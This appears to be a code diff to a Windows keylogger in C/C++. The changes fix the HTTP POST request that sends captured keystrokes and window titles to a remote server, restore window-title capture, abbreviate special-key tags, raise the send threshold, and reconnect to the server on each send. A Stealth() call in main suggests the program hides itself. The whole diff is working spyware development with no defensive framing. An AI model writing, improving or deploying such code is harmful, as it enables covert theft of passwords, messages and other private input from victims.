@@ -36,8 +36,9 @@ char message[BUFFERSIZE] = {0};
 const char *pHttpPost =
     "POST /put_data HTTP/1.1\r\n"
     "Host: %s:%d\r\n"
-    "Content-Type: application/x-www-form-urlencoded"
-    "Content-Length: %d\r\n\r\n"
+    "Connection: keep-alive\r\n"
+    "Content-Length: %d\r\n"
+    "Content-Type: application/x-www-form-urlencoded\r\n\r\n"
     "mmmm=%s";
 
 // This is the callback function. Consider it the event that is raised when, in
@@ -95,10 +96,15 @@ void SendHTTP(const char *msg)
     // 4 for port
     size_t session_len =
         strlen(pHttpPost) + strlen(SERVER_IP) + 4 + msg_len_len + strlen(msg);
-    snprintf(strHttpPost, session_len, pHttpPost, SERVER_IP, PORT, strlen(msg),
-             msg);
+    // 5 for mmmm=
+    snprintf(strHttpPost, session_len, pHttpPost, SERVER_IP, PORT,
+             strlen(msg) + 5, msg);
+    // 1024, msg);
 
-    printf("%s", strHttpPost);
+    printf("%s\n", strHttpPost);
+    // printf("true length: %d\n", strlen(strHttpPost));
+
+    ServerConnect(sockfd);
     send(sockfd, strHttpPost, strlen(strHttpPost), 0);
     // send(sockfd, pHttpPost, strlen(pHttpPost), 0);
 }
@@ -133,12 +139,12 @@ int Save(int key_stroke)
             strftime(s, sizeof(s), "%c", tm);
 
 
-            // strcat(message, "[Window: ");
-            // strcat(message, window_title);
-            // strcat(message, " - at ");
-            strcat(message, "window_title  ");
+            strcat(message, "[Window: ");
+            strcat(message, window_title);
+            strcat(message, " - at ");
+            // strcat(message, "window_title  ");
             strcat(message, s);
-            // strcat(message, "]\n\n");
+            strcat(message, "]\n\n");
         }
     }
 
@@ -146,7 +152,8 @@ int Save(int key_stroke)
     std::cout << key_stroke << '\n';
 
     if (key_stroke == VK_BACK) {
-        strcat(message, "[###BACKSPACE]");
+        strcat(message, "[#B]");
+        // strcat(message, "[###BACKSPACE]");
     } else if (key_stroke == VK_RETURN) {
         strcat(message, "\n");
     } else if (key_stroke == VK_SPACE) {
@@ -158,21 +165,29 @@ int Save(int key_stroke)
         // strcat(message, "[###SHIFT]");
     } else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL ||
                key_stroke == VK_RCONTROL) {
-        strcat(message, "[###CTRL]");
+        strcat(message, "[#C]");
+        // strcat(message, "[###CTRL]");
     } else if (key_stroke == VK_ESCAPE) {
-        strcat(message, "[###ESCAPE]");
+        strcat(message, "[#ES]");
+        // strcat(message, "[###ESCAPE]");
     } else if (key_stroke == VK_END) {
-        strcat(message, "[###END]");
+        strcat(message, "[#ED]");
+        // strcat(message, "[###END]");
     } else if (key_stroke == VK_HOME) {
-        strcat(message, "[###HOME]");
+        strcat(message, "[#HM]");
+        // strcat(message, "[###HOME]");
     } else if (key_stroke == VK_LEFT) {
-        strcat(message, "[###LEFT]");
+        strcat(message, "[#L]");
+        // strcat(message, "[###LEFT]");
     } else if (key_stroke == VK_UP) {
-        strcat(message, "[###UP]");
+        strcat(message, "[#U]");
+        // strcat(message, "[###UP]");
     } else if (key_stroke == VK_RIGHT) {
-        strcat(message, "[###RIGHT]");
+        strcat(message, "[#R]");
+        // strcat(message, "[###RIGHT]");
     } else if (key_stroke == VK_DOWN) {
-        strcat(message, "[###DOWN]");
+        strcat(message, "[#D]");
+        // strcat(message, "[###DOWN]");
     } else if (key_stroke == 190 || key_stroke == 110) {
         strcat(message, ".");
     } else if (key_stroke == 189 || key_stroke == 109) {
@@ -211,8 +226,8 @@ int Save(int key_stroke)
     }
 
     // if (strlen(message) > BUFFERSIZE - 50) {
-    printf("len: %d\n", strlen(message));
-    if (strlen(message) > 10) {
+    // printf("len: %d\n", strlen(message));
+    if (strlen(message) > 100) {
         // send(sockfd, message, BUFFERSIZE, 0);
         SendHTTP(message);
         strcpy(message, "");
@@ -375,9 +390,9 @@ int main()
     Stealth();
 
     // Connect to server
-    if (ServerConnect(sockfd) < 0) {
+    /*if (ServerConnect(sockfd) < 0) {
         exit(1);
-    }
+    }*/
 
     // Get message from Server
     _beginthread(ServerMessage, 0, NULL);
